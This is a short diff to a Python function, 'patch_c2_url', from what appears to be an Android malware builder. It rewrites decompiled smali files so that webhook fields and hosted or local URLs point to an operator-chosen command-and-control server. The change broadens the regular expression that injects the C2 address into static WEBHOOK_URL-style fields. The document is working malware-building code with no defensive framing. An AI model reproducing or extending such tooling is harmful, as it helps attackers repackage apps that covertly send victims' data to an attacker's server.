@@ -184,10 +184,14 @@ def patch_c2_url(target_dir, web_url):
                         with open(sf, 'r', encoding='utf-8', errors='ignore') as sfile:
                             content = sfile.read()
 
-                        new_content = re.sub(r'https?://[a-zA-Z0-9_.-]*onrender\.com[^\s"\'\`]*', web_url_clean, content)
+                        new_content = re.sub(
+                            r'(\.field\s+public\s+static\s+(?:final\s+)?(?:WEBHOOK_URL|REMOTE_WEBHOOK_URL|DEFAULT_WEBHOOK):Ljava/lang/String;\s*=\s*")[^"]*(")',
+                            r'\1' + web_url_clean + r'\2',
+                            content
+                        )
+                        new_content = re.sub(r'https?://[a-zA-Z0-9_.-]*onrender\.com[^\s"\'\`]*', web_url_clean, new_content)
                         new_content = re.sub(r'http://127\.0\.0\.1:\d+[^\s"\'\`]*', web_url_clean, new_content)
                         new_content = re.sub(r'http://localhost:\d+[^\s"\'\`]*', web_url_clean, new_content)
-                        new_content = re.sub(r'(\.field\s+public\s+static\s+final\s+WEBHOOK_URL:Ljava/lang/String;\s*=\s*")[^"]*(")', r'\1' + web_url_clean + r'\2', new_content)
 
                         if new_content != content:
                             with open(sf, 'w', encoding='utf-8') as sfile:
